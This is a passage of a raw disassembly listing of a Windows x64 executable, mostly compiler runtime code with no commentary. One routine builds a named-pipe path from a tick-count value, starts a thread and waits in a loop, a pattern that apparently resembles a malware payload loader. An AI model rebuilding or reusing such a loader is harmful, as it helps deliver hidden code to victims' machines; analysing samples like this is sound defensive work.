  4017a3:	41 5c                	pop    %r12
  4017a5:	c3                   	ret
  4017a6:	41 54                	push   %r12
  4017a8:	56                   	push   %rsi
  4017a9:	53                   	push   %rbx
  4017aa:	48 83 ec 20          	sub    $0x20,%rsp
  4017ae:	48 8b 1d fb 3c 00 00 	mov    0x3cfb(%rip),%rbx        # 0x4054b0
  4017b5:	48 63 4b 04          	movslq 0x4(%rbx),%rcx
  4017b9:	e8 82 16 00 00       	call   0x402e40
  4017be:	48 8b 35 27 7b 00 00 	mov    0x7b27(%rip),%rsi        # 0x4092ec
  4017c5:	49 89 c4             	mov    %rax,%r12
  4017c8:	b9 00 04 00 00       	mov    $0x400,%ecx
  4017cd:	ff d6                	call   *%rsi
  4017cf:	8b 53 04             	mov    0x4(%rbx),%edx
  4017d2:	4c 89 e1             	mov    %r12,%rcx
  4017d5:	e8 2a ff ff ff       	call   0x401704
  4017da:	85 c0                	test   %eax,%eax
  4017dc:	74 ea                	je     0x4017c8
  4017de:	8b 53 04             	mov    0x4(%rbx),%edx
  4017e1:	4c 8d 43 08          	lea    0x8(%rbx),%r8
  4017e5:	4c 89 e1             	mov    %r12,%rcx
  4017e8:	e8 a8 fd ff ff       	call   0x401595
  4017ed:	31 c0                	xor    %eax,%eax
  4017ef:	48 83 c4 20          	add    $0x20,%rsp
  4017f3:	5b                   	pop    %rbx
  4017f4:	5e                   	pop    %rsi
  4017f5:	41 5c                	pop    %r12
  4017f7:	c3                   	ret
  4017f8:	48 83 ec 68          	sub    $0x68,%rsp
  4017fc:	ff 15 9a 7a 00 00    	call   *0x7a9a(%rip)        # 0x40929c
  401802:	b9 aa 26 00 00       	mov    $0x26aa,%ecx
  401807:	31 d2                	xor    %edx,%edx
  401809:	41 b9 5c 00 00 00    	mov    $0x5c,%r9d
  40180f:	f7 f1                	div    %ecx
  401811:	c7 44 24 50 5c 00 00 	movl   $0x5c,0x50(%rsp)
  401818:	00 
  401819:	c7 44 24 48 65 00 00 	movl   $0x65,0x48(%rsp)
  401820:	00 
  401821:	c7 44 24 40 70 00 00 	movl   $0x70,0x40(%rsp)
  401828:	00 
  401829:	c7 44 24 38 69 00 00 	movl   $0x69,0x38(%rsp)
  401830:	00 
  401831:	c7 44 24 30 70 00 00 	movl   $0x70,0x30(%rsp)
  401838:	00 
  401839:	c7 44 24 28 5c 00 00 	movl   $0x5c,0x28(%rsp)
  401840:	00 
  401841:	c7 44 24 20 2e 00 00 	movl   $0x2e,0x20(%rsp)
  401848:	00 
  401849:	41 b8 5c 00 00 00    	mov    $0x5c,%r8d
  40184f:	48 8d 0d 2a 71 00 00 	lea    0x712a(%rip),%rcx        # 0x408980
  401856:	89 54 24 58          	mov    %edx,0x58(%rsp)
  40185a:	48 8d 15 9f 37 00 00 	lea    0x379f(%rip),%rdx        # 0x405000
  401861:	e8 c2 15 00 00       	call   0x402e28
  401866:	31 c9                	xor    %ecx,%ecx
  401868:	45 31 c9             	xor    %r9d,%r9d
  40186b:	31 d2                	xor    %edx,%edx
  40186d:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
  401874:	00 00 
  401876:	4c 8d 05 69 fe ff ff 	lea    -0x197(%rip),%r8        # 0x4016e6
  40187d:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%rsp)
  401884:	00 
  401885:	ff 15 b9 79 00 00    	call   *0x79b9(%rip)        # 0x409244
  40188b:	31 c9                	xor    %ecx,%ecx
  40188d:	48 83 c4 68          	add    $0x68,%rsp
  401891:	e9 10 ff ff ff       	jmp    0x4017a6
  401896:	90                   	nop
  401897:	90                   	nop
  401898:	90                   	nop
  401899:	90                   	nop
  40189a:	90                   	nop
  40189b:	90                   	nop
  40189c:	90                   	nop
  40189d:	90                   	nop
  40189e:	90                   	nop
  40189f:	90                   	nop
  4018a0:	48 83 ec 28          	sub    $0x28,%rsp
  4018a4:	48 8b 05 95 2b 00 00 	mov    0x2b95(%rip),%rax        # 0x404440
  4018ab:	48 8b 00             	mov    (%rax),%rax
  4018ae:	48 85 c0             	test   %rax,%rax
  4018b1:	74 22                	je     0x4018d5
  4018b3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  4018b8:	ff d0                	call   *%rax
  4018ba:	48 8b 05 7f 2b 00 00 	mov    0x2b7f(%rip),%rax        # 0x404440
  4018c1:	48 8d 50 08          	lea    0x8(%rax),%rdx
  4018c5:	48 8b 40 08          	mov    0x8(%rax),%rax
  4018c9:	48 89 15 70 2b 00 00 	mov    %rdx,0x2b70(%rip)        # 0x404440
  4018d0:	48 85 c0             	test   %rax,%rax
  4018d3:	75 e3                	jne    0x4018b8
  4018d5:	48 83 c4 28          	add    $0x28,%rsp
  4018d9:	c3                   	ret
  4018da:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  4018e0:	56                   	push   %rsi
  4018e1:	53                   	push   %rbx
  4018e2:	48 83 ec 28          	sub    $0x28,%rsp
  4018e6:	48 8b 15 83 3a 00 00 	mov    0x3a83(%rip),%rdx        # 0x405370
  4018ed:	48 8b 02             	mov    (%rdx),%rax
  4018f0:	89 c1                	mov    %eax,%ecx
  4018f2:	83 f8 ff             	cmp    $0xffffffff,%eax
  4018f5:	74 39                	je     0x401930
  4018f7:	85 c9                	test   %ecx,%ecx
  4018f9:	74 20                	je     0x40191b
  4018fb:	89 c8                	mov    %ecx,%eax
  4018fd:	83 e9 01             	sub    $0x1,%ecx
  401900:	48 8d 1c c2          	lea    (%rdx,%rax,8),%rbx
  401904:	48 29 c8             	sub    %rcx,%rax
  401907:	48 8d 74 c2 f8       	lea    -0x8(%rdx,%rax,8),%rsi
  40190c:	0f 1f 40 00          	nopl   0x0(%rax)
  401910:	ff 13                	call   *(%rbx)
  401912:	48 83 eb 08          	sub    $0x8,%rbx
  401916:	48 39 f3             	cmp    %rsi,%rbx
  401919:	75 f5                	jne    0x401910
  40191b:	48 8d 0d 7e ff ff ff 	lea    -0x82(%rip),%rcx        # 0x4018a0
  401922:	48 83 c4 28          	add    $0x28,%rsp
  401926:	5b                   	pop    %rbx
  401927:	5e                   	pop    %rsi
  401928:	e9 f3 fb ff ff       	jmp    0x401520
  40192d:	0f 1f 00             	nopl   (%rax)
  401930:	31 c0                	xor    %eax,%eax
  401932:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  401938:	44 8d 40 01          	lea    0x1(%rax),%r8d
  40193c:	89 c1                	mov    %eax,%ecx
  40193e:	4a 83 3c c2 00       	cmpq   $0x0,(%rdx,%r8,8)
  401943:	4c 89 c0             	mov    %r8,%rax
  401946:	75 f0                	jne    0x401938
  401948:	eb ad                	jmp    0x4018f7
  40194a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  401950:	8b 05 da 66 00 00    	mov    0x66da(%rip),%eax        # 0x408030
  401956:	85 c0                	test   %eax,%eax
  401958:	74 06                	je     0x401960
  40195a:	c3                   	ret
  40195b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  401960:	c7 05 c6 66 00 00 01 	movl   $0x1,0x66c6(%rip)        # 0x408030
  401967:	00 00 00 
  40196a:	e9 71 ff ff ff       	jmp    0x4018e0
  40196f:	90                   	nop
  401970:	48 ff 25 dd 79 00 00 	rex.W jmp *0x79dd(%rip)        # 0x409354
  401977:	90                   	nop
  401978:	90                   	nop
  401979:	90                   	nop
  40197a:	90                   	nop
  40197b:	90                   	nop
  40197c:	90                   	nop
  40197d:	90                   	nop
  40197e:	90                   	nop
  40197f:	90                   	nop
  401980:	31 c0                	xor    %eax,%eax
  401982:	c3                   	ret
  401983:	90                   	nop
  401984:	90                   	nop
  401985:	90                   	nop
  401986:	90                   	nop
  401987:	90                   	nop
  401988:	90                   	nop
  401989:	90                   	nop
  40198a:	90                   	nop
  40198b:	90                   	nop
  40198c:	90                   	nop
  40198d:	90                   	nop
  40198e:	90                   	nop
  40198f:	90                   	nop
  401990:	41 54                	push   %r12
  401992:	55                   	push   %rbp
  401993:	57                   	push   %rdi
  401994:	56                   	push   %rsi
  401995:	53                   	push   %rbx
  401996:	48 83 ec 30          	sub    $0x30,%rsp
  40199a:	48 8b 1d 2f 2b 00 00 	mov    0x2b2f(%rip),%rbx        # 0x4044d0
  4019a1:	48 b8 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rax
  4019a8:	2b 00 00 
  4019ab:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
  4019b2:	00 00 
  4019b4:	48 39 c3             	cmp    %rax,%rbx
  4019b7:	74 17                	je     0x4019d0
  4019b9:	48 f7 d3             	not    %rbx
  4019bc:	48 89 1d 1d 2b 00 00 	mov    %rbx,0x2b1d(%rip)        # 0x4044e0
  4019c3:	48 83 c4 30          	add    $0x30,%rsp
  4019c7:	5b                   	pop    %rbx
  4019c8:	5e                   	pop    %rsi
  4019c9:	5f                   	pop    %rdi
  4019ca:	5d                   	pop    %rbp
  4019cb:	41 5c                	pop    %r12
  4019cd:	c3                   	ret
  4019ce:	66 90                	xchg   %ax,%ax
  4019d0:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
  4019d5:	ff 15 b9 78 00 00    	call   *0x78b9(%rip)        # 0x409294
  4019db:	48 8b 74 24 20       	mov    0x20(%rsp),%rsi
  4019e0:	ff 15 7e 78 00 00    	call   *0x787e(%rip)        # 0x409264
  4019e6:	89 c5                	mov    %eax,%ebp
  4019e8:	ff 15 7e 78 00 00    	call   *0x787e(%rip)        # 0x40926c
  4019ee:	89 c7                	mov    %eax,%edi
  4019f0:	ff 15 a6 78 00 00    	call   *0x78a6(%rip)        # 0x40929c
  4019f6:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
  4019fb:	41 89 c4             	mov    %eax,%r12d
  4019fe:	ff 15 b0 78 00 00    	call   *0x78b0(%rip)        # 0x4092b4
  401a04:	48 33 74 24 28       	xor    0x28(%rsp),%rsi
  401a09:	89 e8                	mov    %ebp,%eax
  401a0b:	48 ba ff ff ff ff ff 	movabs $0xffffffffffff,%rdx
  401a12:	ff 00 00 
  401a15:	48 31 f0             	xor    %rsi,%rax
  401a18:	89 fe                	mov    %edi,%esi
  401a1a:	48 31 c6             	xor    %rax,%rsi
  401a1d:	44 89 e0             	mov    %r12d,%eax
  401a20:	48 31 f0             	xor    %rsi,%rax
  401a23:	48 21 d0             	and    %rdx,%rax
  401a26:	48 39 d8             	cmp    %rbx,%rax
  401a29:	74 25                	je     0x401a50
  401a2b:	48 89 c2             	mov    %rax,%rdx
  401a2e:	48 f7 d2             	not    %rdx
  401a31:	48 89 05 98 2a 00 00 	mov    %rax,0x2a98(%rip)        # 0x4044d0
  401a38:	48 89 15 a1 2a 00 00 	mov    %rdx,0x2aa1(%rip)        # 0x4044e0
  401a3f:	48 83 c4 30          	add    $0x30,%rsp
  401a43:	5b                   	pop    %rbx
  401a44:	5e                   	pop    %rsi
  401a45:	5f                   	pop    %rdi
  401a46:	5d                   	pop    %rbp
  401a47:	41 5c                	pop    %r12
  401a49:	c3                   	ret
  401a4a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  401a50:	48 ba cc 5d 20 d2 66 	movabs $0xffffd466d2205dcc,%rdx
  401a57:	d4 ff ff 
  401a5a:	48 b8 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rax
  401a61:	2b 00 00 
  401a64:	eb cb                	jmp    0x401a31
  401a66:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  401a6d:	00 00 00 
  401a70:	55                   	push   %rbp
  401a71:	56                   	push   %rsi
  401a72:	53                   	push   %rbx
  401a73:	48 89 e5             	mov    %rsp,%rbp
  401a76:	48 83 ec 70          	sub    $0x70,%rsp
  401a7a:	48 89 cb             	mov    %rcx,%rbx
  401a7d:	48 8d 0d dc 65 00 00 	lea    0x65dc(%rip),%rcx        # 0x408060
  401a84:	ff 15 42 78 00 00    	call   *0x7842(%rip)        # 0x4092cc
  401a8a:	48 8b 35 c7 66 00 00 	mov    0x66c7(%rip),%rsi        # 0x408158
  401a91:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
  401a95:	45 31 c0             	xor    %r8d,%r8d
  401a98:	48 89 f1             	mov    %rsi,%rcx
  401a9b:	ff 15 33 78 00 00    	call   *0x7833(%rip)        # 0x4092d4
  401aa1:	49 89 c1             	mov    %rax,%r9
  401aa4:	48 85 c0             	test   %rax,%rax
  401aa7:	0f 84 a0 00 00 00    	je     0x401b4d
  401aad:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
  401ab1:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
  401ab5:	49 89 f0             	mov    %rsi,%r8
  401ab8:	31 c9                	xor    %ecx,%ecx
  401aba:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  401abf:	48 8d 45 e8          	lea    -0x18(%rbp),%rax
  401ac3:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  401ac8:	48 8d 05 91 65 00 00 	lea    0x6591(%rip),%rax        # 0x408060
  401acf:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
  401ad6:	00 00 
  401ad8:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  401add:	ff 15 f9 77 00 00    	call   *0x77f9(%rip)        # 0x4092dc
  401ae3:	48 8b 05 6e 66 00 00 	mov    0x666e(%rip),%rax        # 0x408158
  401aea:	31 c9                	xor    %ecx,%ecx
  401aec:	48 89 1d ed 65 00 00 	mov    %rbx,0x65ed(%rip)        # 0x4080e0
  401af3:	48 89 05 56 6a 00 00 	mov    %rax,0x6a56(%rip)        # 0x408550
  401afa:	48 b8 09 04 00 c0 01 	movabs $0x1c0000409,%rax
  401b01:	00 00 00 
  401b04:	48 89 05 35 6a 00 00 	mov    %rax,0x6a35(%rip)        # 0x408540
  401b0b:	48 8b 05 be 29 00 00 	mov    0x29be(%rip),%rax        # 0x4044d0
  401b12:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  401b16:	48 8b 05 c3 29 00 00 	mov    0x29c3(%rip),%rax        # 0x4044e0
  401b1d:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  401b21:	ff 15 bd 77 00 00    	call   *0x77bd(%rip)        # 0x4092e4
  401b27:	48 8d 0d 02 35 00 00 	lea    0x3502(%rip),%rcx        # 0x405030
  401b2e:	ff 15 d0 77 00 00    	call   *0x77d0(%rip)        # 0x409304
  401b34:	ff 15 22 77 00 00    	call   *0x7722(%rip)        # 0x40925c
  401b3a:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
  401b3f:	48 89 c1             	mov    %rax,%rcx
  401b42:	ff 15 ac 77 00 00    	call   *0x77ac(%rip)        # 0x4092f4
  401b48:	e8 23 13 00 00       	call   0x402e70
  401b4d:	48 8b 45 18          	mov    0x18(%rbp),%rax
  401b51:	48 89 05 00 66 00 00 	mov    %rax,0x6600(%rip)        # 0x408158
  401b58:	48 8d 45 08          	lea    0x8(%rbp),%rax
  401b5c:	48 89 05 95 65 00 00 	mov    %rax,0x6595(%rip)        # 0x4080f8
  401b63:	e9 7b ff ff ff       	jmp    0x401ae3
  401b68:	90                   	nop
  401b69:	90                   	nop
  401b6a:	90                   	nop
  401b6b:	90                   	nop
  401b6c:	90                   	nop
  401b6d:	90                   	nop
  401b6e:	90                   	nop
  401b6f:	90                   	nop
  401b70:	48 83 ec 28          	sub    $0x28,%rsp
  401b74:	83 fa 03             	cmp    $0x3,%edx
  401b77:	74 17                	je     0x401b90
  401b79:	85 d2                	test   %edx,%edx
  401b7b:	74 13                	je     0x401b90
  401b7d:	b8 01 00 00 00       	mov    $0x1,%eax
  401b82:	48 83 c4 28          	add    $0x28,%rsp
  401b86:	c3                   	ret
  401b87:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  401b8e:	00 00 
  401b90:	e8 7b 0d 00 00       	call   0x402910
  401b95:	b8 01 00 00 00       	mov    $0x1,%eax
  401b9a:	48 83 c4 28          	add    $0x28,%rsp
  401b9e:	c3                   	ret
  401b9f:	90                   	nop
  401ba0:	56                   	push   %rsi
  401ba1:	53                   	push   %rbx
  401ba2:	48 83 ec 28          	sub    $0x28,%rsp
  401ba6:	48 8b 05 a3 37 00 00 	mov    0x37a3(%rip),%rax        # 0x405350
  401bad:	83 38 02             	cmpl   $0x2,(%rax)
  401bb0:	74 06                	je     0x401bb8
  401bb2:	c7 00 02 00 00 00    	movl   $0x2,(%rax)
  401bb8:	83 fa 02             	cmp    $0x2,%edx
  401bbb:	74 13                	je     0x401bd0
  401bbd:	83 fa 01             	cmp    $0x1,%edx
  401bc0:	74 4e                	je     0x401c10
  401bc2:	b8 01 00 00 00       	mov    $0x1,%eax
  401bc7:	48 83 c4 28          	add    $0x28,%rsp
  401bcb:	5b                   	pop    %rbx
  401bcc:	5e                   	pop    %rsi
  401bcd:	c3                   	ret
  401bce:	66 90                	xchg   %ax,%ax
  401bd0:	48 8d 1d 89 84 00 00 	lea    0x8489(%rip),%rbx        # 0x40a060
  401bd7:	48 8d 35 82 84 00 00 	lea    0x8482(%rip),%rsi        # 0x40a060
  401bde:	48 39 de             	cmp    %rbx,%rsi
  401be1:	74 df                	je     0x401bc2
  401be3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  401be8:	48 8b 03             	mov    (%rbx),%rax
  401beb:	48 85 c0             	test   %rax,%rax
  401bee:	74 02                	je     0x401bf2
  401bf0:	ff d0                	call   *%rax
  401bf2:	48 83 c3 08          	add    $0x8,%rbx
  401bf6:	48 39 de             	cmp    %rbx,%rsi
  401bf9:	75 ed                	jne    0x401be8
  401bfb:	b8 01 00 00 00       	mov    $0x1,%eax
  401c00:	48 83 c4 28          	add    $0x28,%rsp
  401c04:	5b                   	pop    %rbx
  401c05:	5e                   	pop    %rsi
  401c06:	c3                   	ret
  401c07:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  401c0e:	00 00 
  401c10:	e8 fb 0c 00 00       	call   0x402910
  401c15:	b8 01 00 00 00       	mov    $0x1,%eax
  401c1a:	48 83 c4 28          	add    $0x28,%rsp
  401c1e:	5b                   	pop    %rbx
  401c1f:	5e                   	pop    %rsi
  401c20:	c3                   	ret
  401c21:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
  401c28:	00 00 00 00 
  401c2c:	0f 1f 40 00          	nopl   0x0(%rax)
  401c30:	31 c0                	xor    %eax,%eax
  401c32:	c3                   	ret
  401c33:	90                   	nop
  401c34:	90                   	nop
  401c35:	90                   	nop
  401c36:	90                   	nop
  401c37:	90                   	nop
  401c38:	90                   	nop
  401c39:	90                   	nop
  401c3a:	90                   	nop
  401c3b:	90                   	nop
  401c3c:	90                   	nop
  401c3d:	90                   	nop
  401c3e:	90                   	nop
  401c3f:	90                   	nop
  401c40:	56                   	push   %rsi
  401c41:	53                   	push   %rbx
  401c42:	48 83 ec 78          	sub    $0x78,%rsp
  401c46:	0f 11 74 24 40       	movups %xmm6,0x40(%rsp)
  401c4b:	0f 11 7c 24 50       	movups %xmm7,0x50(%rsp)
  401c50:	44 0f 11 44 24 60    	movups %xmm8,0x60(%rsp)
  401c56:	83 39 06             	cmpl   $0x6,(%rcx)
  401c59:	0f 87 cd 00 00 00    	ja     0x401d2c
  401c5f:	8b 01                	mov    (%rcx),%eax
  401c61:	48 8d 15 5c 35 00 00 	lea    0x355c(%rip),%rdx        # 0x4051c4
  401c68:	48 63 04 82          	movslq (%rdx,%rax,4),%rax
  401c6c:	48 01 d0             	add    %rdx,%rax
  401c6f:	ff e0                	jmp    *%rax
  401c71:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  401c78:	48 8d 1d f7 34 00 00 	lea    0x34f7(%rip),%rbx        # 0x405176
  401c7f:	f2 44 0f 10 41 20    	movsd  0x20(%rcx),%xmm8
  401c85:	f2 0f 10 79 18       	movsd  0x18(%rcx),%xmm7
  401c8a:	f2 0f 10 71 10       	movsd  0x10(%rcx),%xmm6
  401c8f:	48 8b 71 08          	mov    0x8(%rcx),%rsi
  401c93:	b9 02 00 00 00       	mov    $0x2,%ecx
  401c98:	e8 23 12 00 00       	call   0x402ec0
  401c9d:	f2 44 0f 11 44 24 30 	movsd  %xmm8,0x30(%rsp)
  401ca4:	49 89 d8             	mov    %rbx,%r8
  401ca7:	48 8d 15 ea 34 00 00 	lea    0x34ea(%rip),%rdx        # 0x405198
  401cae:	f2 0f 11 7c 24 28    	movsd  %xmm7,0x28(%rsp)
  401cb4:	48 89 c1             	mov    %rax,%rcx
  401cb7:	49 89 f1             	mov    %rsi,%r9
  401cba:	f2 0f 11 74 24 20    	movsd  %xmm6,0x20(%rsp)
  401cc0:	e8 93 11 00 00       	call   0x402e58
  401cc5:	90                   	nop
  401cc6:	0f 10 74 24 40       	movups 0x40(%rsp),%xmm6
  401ccb:	0f 10 7c 24 50       	movups 0x50(%rsp),%xmm7
  401cd0:	31 c0                	xor    %eax,%eax
  401cd2:	44 0f 10 44 24 60    	movups 0x60(%rsp),%xmm8
  401cd8:	48 83 c4 78          	add    $0x78,%rsp
  401cdc:	5b                   	pop    %rbx
  401cdd:	5e                   	pop    %rsi
  401cde:	c3                   	ret
  401cdf:	90                   	nop
  401ce0:	48 8d 1d c9 33 00 00 	lea    0x33c9(%rip),%rbx        # 0x4050b0
  401ce7:	eb 96                	jmp    0x401c7f
  401ce9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  401cf0:	48 8d 1d f9 33 00 00 	lea    0x33f9(%rip),%rbx        # 0x4050f0
  401cf7:	eb 86                	jmp    0x401c7f
  401cf9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  401d00:	48 8d 1d c9 33 00 00 	lea    0x33c9(%rip),%rbx        # 0x4050d0
  401d07:	e9 73 ff ff ff       	jmp    0x401c7f
  401d0c:	0f 1f 40 00          	nopl   0x0(%rax)
  401d10:	48 8d 1d 29 34 00 00 	lea    0x3429(%rip),%rbx        # 0x405140
  401d17:	e9 63 ff ff ff       	jmp    0x401c7f
  401d1c:	0f 1f 40 00          	nopl   0x0(%rax)
  401d20:	48 8d 1d f1 33 00 00 	lea    0x33f1(%rip),%rbx        # 0x405118
  401d27:	e9 53 ff ff ff       	jmp    0x401c7f
  401d2c:	48 8d 1d 6d 33 00 00 	lea    0x336d(%rip),%rbx        # 0x4050a0
  401d33:	e9 47 ff ff ff       	jmp    0x401c7f
  401d38:	90                   	nop
  401d39:	90                   	nop
  401d3a:	90                   	nop
  401d3b:	90                   	nop
  401d3c:	90                   	nop
  401d3d:	90                   	nop
  401d3e:	90                   	nop
  401d3f:	90                   	nop
  401d40:	db e3                	fninit
  401d42:	c3                   	ret
  401d43:	90                   	nop
  401d44:	90                   	nop
  401d45:	90                   	nop
  401d46:	90                   	nop
  401d47:	90                   	nop
  401d48:	90                   	nop
  401d49:	90                   	nop
  401d4a:	90                   	nop
  401d4b:	90                   	nop
  401d4c:	90                   	nop
  401d4d:	90                   	nop
  401d4e:	90                   	nop
  401d4f:	90                   	nop
  401d50:	41 54                	push   %r12
  401d52:	53                   	push   %rbx
  401d53:	48 83 ec 38          	sub    $0x38,%rsp
  401d57:	49 89 cc             	mov    %rcx,%r12
  401d5a:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
  401d5f:	b9 02 00 00 00       	mov    $0x2,%ecx
  401d64:	48 89 54 24 58       	mov    %rdx,0x58(%rsp)
  401d69:	4c 89 44 24 60       	mov    %r8,0x60(%rsp)
  401d6e:	4c 89 4c 24 68       	mov    %r9,0x68(%rsp)
  401d73:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  401d78:	e8 43 11 00 00       	call   0x402ec0
  401d7d:	41 b8 1b 00 00 00    	mov    $0x1b,%r8d
  401d83:	ba 01 00 00 00       	mov    $0x1,%edx
  401d88:	48 8d 0d 51 34 00 00 	lea    0x3451(%rip),%rcx        # 0x4051e0
  401d8f:	49 89 c1             	mov    %rax,%r9
  401d92:	e8 b1 10 00 00       	call   0x402e48
  401d97:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
  401d9c:	b9 02 00 00 00       	mov    $0x2,%ecx
  401da1:	e8 1a 11 00 00       	call   0x402ec0
  401da6:	4c 89 e2             	mov    %r12,%rdx
  401da9:	48 89 c1             	mov    %rax,%rcx
  401dac:	49 89 d8             	mov    %rbx,%r8
  401daf:	e8 5c 10 00 00       	call   0x402e10
  401db4:	e8 b7 10 00 00       	call   0x402e70
  401db9:	90                   	nop
  401dba:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  401dc0:	41 54                	push   %r12
  401dc2:	55                   	push   %rbp
  401dc3:	57                   	push   %rdi
  401dc4:	56                   	push   %rsi
  401dc5:	53                   	push   %rbx
  401dc6:	48 83 ec 50          	sub    $0x50,%rsp
  401dca:	48 63 3d 43 68 00 00 	movslq 0x6843(%rip),%rdi        # 0x408614
  401dd1:	49 89 cc             	mov    %rcx,%r12
  401dd4:	48 89 d6             	mov    %rdx,%rsi
  401dd7:	4c 89 c3             	mov    %r8,%rbx
  401dda:	85 ff                	test   %edi,%edi
  401ddc:	0f 8e 86 01 00 00    	jle    0x401f68
  401de2:	48 8b 05 2f 68 00 00 	mov    0x682f(%rip),%rax        # 0x408618
  401de9:	31 c9                	xor    %ecx,%ecx
  401deb:	48 83 c0 18          	add    $0x18,%rax
  401def:	90                   	nop
  401df0:	48 8b 10             	mov    (%rax),%rdx
  401df3:	49 39 d4             	cmp    %rdx,%r12
  401df6:	72 14                	jb     0x401e0c
  401df8:	4c 8b 40 08          	mov    0x8(%rax),%r8
  401dfc:	45 8b 40 08          	mov    0x8(%r8),%r8d
  401e00:	4c 01 c2             	add    %r8,%rdx
  401e03:	49 39 d4             	cmp    %rdx,%r12
  401e06:	0f 82 8b 00 00 00    	jb     0x401e97
  401e0c:	83 c1 01             	add    $0x1,%ecx
  401e0f:	48 83 c0 28          	add    $0x28,%rax
  401e13:	39 f9                	cmp    %edi,%ecx
  401e15:	75 d9                	jne    0x401df0
  401e17:	4c 89 e1             	mov    %r12,%rcx
  401e1a:	e8 01 0d 00 00       	call   0x402b20
  401e1f:	48 89 c5             	mov    %rax,%rbp
  401e22:	48 85 c0             	test   %rax,%rax
  401e25:	0f 84 77 01 00 00    	je     0x401fa2
  401e2b:	48 8b 05 e6 67 00 00 	mov    0x67e6(%rip),%rax        # 0x408618
  401e32:	48 8d 3c bf          	lea    (%rdi,%rdi,4),%rdi
  401e36:	48 c1 e7 03          	shl    $0x3,%rdi
  401e3a:	48 01 f8             	add    %rdi,%rax
  401e3d:	48 89 68 20          	mov    %rbp,0x20(%rax)
  401e41:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
  401e47:	e8 04 0e 00 00       	call   0x402c50
  401e4c:	8b 4d 0c             	mov    0xc(%rbp),%ecx
  401e4f:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
  401e54:	41 b8 30 00 00 00    	mov    $0x30,%r8d
  401e5a:	48 01 c1             	add    %rax,%rcx
  401e5d:	48 8b 05 b4 67 00 00 	mov    0x67b4(%rip),%rax        # 0x408618
  401e64:	48 89 4c 38 18       	mov    %rcx,0x18(%rax,%rdi,1)
  401e69:	ff 15 ad 74 00 00    	call   *0x74ad(%rip)        # 0x40931c
  401e6f:	48 85 c0             	test   %rax,%rax
  401e72:	0f 84 39 01 00 00    	je     0x401fb1
  401e78:	8b 44 24 44          	mov    0x44(%rsp),%eax
  401e7c:	8d 50 c0             	lea    -0x40(%rax),%edx
  401e7f:	83 e2 bf             	and    $0xffffffbf,%edx
  401e82:	74 0c                	je     0x401e90
  401e84:	83 e8 04             	sub    $0x4,%eax
  401e87:	83 e0 fb             	and    $0xfffffffb,%eax
  401e8a:	0f 85 90 00 00 00    	jne    0x401f20
  401e90:	83 05 7d 67 00 00 01 	addl   $0x1,0x677d(%rip)        # 0x408614
  401e97:	83 fb 08             	cmp    $0x8,%ebx
  401e9a:	73 2c                	jae    0x401ec8
  401e9c:	f6 c3 04             	test   $0x4,%bl
  401e9f:	0f 85 cb 00 00 00    	jne    0x401f70
  401ea5:	85 db                	test   %ebx,%ebx
  401ea7:	74 10                	je     0x401eb9
  401ea9:	0f b6 06             	movzbl (%rsi),%eax
  401eac:	41 88 04 24          	mov    %al,(%r12)
  401eb0:	f6 c3 02             	test   $0x2,%bl
  401eb3:	0f 85 d7 00 00 00    	jne    0x401f90
  401eb9:	48 83 c4 50          	add    $0x50,%rsp
  401ebd:	5b                   	pop    %rbx
  401ebe:	5e                   	pop    %rsi
  401ebf:	5f                   	pop    %rdi
  401ec0:	5d                   	pop    %rbp
  401ec1:	41 5c                	pop    %r12
  401ec3:	c3                   	ret
  401ec4:	0f 1f 40 00          	nopl   0x0(%rax)
  401ec8:	48 8b 06             	mov    (%rsi),%rax
  401ecb:	49 8d 4c 24 08       	lea    0x8(%r12),%rcx
  401ed0:	48 83 e1 f8          	and    $0xfffffffffffffff8,%rcx
  401ed4:	49 89 04 24          	mov    %rax,(%r12)
  401ed8:	89 d8                	mov    %ebx,%eax
  401eda:	48 8b 54 06 f8       	mov    -0x8(%rsi,%rax,1),%rdx
  401edf:	49 89 54 04 f8       	mov    %rdx,-0x8(%r12,%rax,1)
  401ee4:	49 29 cc             	sub    %rcx,%r12
  401ee7:	44 01 e3             	add    %r12d,%ebx
  401eea:	4c 29 e6             	sub    %r12,%rsi
  401eed:	83 e3 f8             	and    $0xfffffff8,%ebx
  401ef0:	83 fb 08             	cmp    $0x8,%ebx
  401ef3:	72 c4                	jb     0x401eb9
  401ef5:	83 e3 f8             	and    $0xfffffff8,%ebx
  401ef8:	31 c0                	xor    %eax,%eax
  401efa:	89 c2                	mov    %eax,%edx
